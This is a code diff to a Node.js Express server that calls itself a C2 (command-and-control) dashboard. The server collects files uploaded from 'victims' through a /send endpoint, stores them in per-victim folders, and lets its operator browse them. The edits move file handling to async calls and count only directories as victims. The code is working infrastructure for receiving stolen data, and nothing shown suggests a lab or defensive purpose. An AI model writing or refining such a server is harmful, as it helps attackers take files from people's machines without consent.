@@ -1,4 +1,6 @@
-const fs = require('fs');
+const fs = require('fs').promises;
+const fsSync = require('fs');
+const path = require('path');
 const express = require('express');
 const cors = require('cors');
 
@@ -21,8 +23,8 @@ const SECRET_TOKEN = process.env.SECRET_TOKEN || 'qutmess';
 // Ensure victims folder exists
 (async () => {
     try {
-        if (!fs.existsSync(VICTIMS_DIR)) {
-            fs.mkdirSync(VICTIMS_DIR);
+        if (!fsSync.existsSync(VICTIMS_DIR)) {
+            fsSync.mkdirSync(VICTIMS_DIR);
         }
         console.log(`Victims folder ready at ${VICTIMS_DIR}`);
     } catch (err) {
@@ -35,7 +37,14 @@ const SECRET_TOKEN = process.env.SECRET_TOKEN || 'qutmess';
 app.get('/', async (req, res) => {
     try {
         const victims = await fs.readdir(VICTIMS_DIR);
-        res.send(`<h2>C2 Dashboard — ${victims.length} victims</h2><ul>${victims.map(v => `<li><a href="/victim/${v}">${v}</a></li>`).join('')}</ul>`);
+        const dirs = [];
+        for (const v of victims) {
+            const stat = await fs.stat(path.join(VICTIMS_DIR, v));
+            if (stat.isDirectory()) {
+                dirs.push(v);
+            }
+        }
+        res.send(`<h2>C2 Dashboard — ${dirs.length} victims</h2><ul>${dirs.map(v => `<li><a href="/victim/${v}">${v}</a></li>`).join('')}</ul>`);
     } catch (err) {
         console.error('Failed to read victims folder:', err);
         res.status(500).send('Internal Server Error');
@@ -58,8 +67,8 @@ app.post('/send', async (req, res) => {
         const filePath = `${victimDir}/${path.basename(file)}`;
 
         try {
-            await fs.mkdirSync(victimDir, { recursive: true });
-            await fs.copyFileSync(file.path, filePath);
+            await fs.mkdir(victimDir, { recursive: true });
+            await fs.copyFile(file.path, filePath);
             console.log(`[+] ${safeFolder} — saved ${path.basename(file)}`);
             res.json({ success: true });
         } catch (err) {
@@ -89,7 +98,7 @@ app.get(/^\/victim\/([^\/]+)\/(.+)/, async (req, res) => {
                 res.send(`<h2>Folder: ${subPath || safeId}</h2><a href="${backLink}">⬅ Back</a><ul>${files.map(f => {
                     const itemPath = subPath ? `${subPath}/${f}` : f;
                     const itemFullPath = `${fullPath}/${f}`;
-                    const isDir = fs.statSync(itemFullPath).isDirectory();
+                    const isDir = fsSync.statSync(itemFullPath).isDirectory();
                     return `<li><a href="/victim/${safeId}/${itemPath.replace(/\\/g, '/')}${isDir ? '/' : ''}">${f}</a></li>`;
                 }).join('')}</ul>`);
                 return;
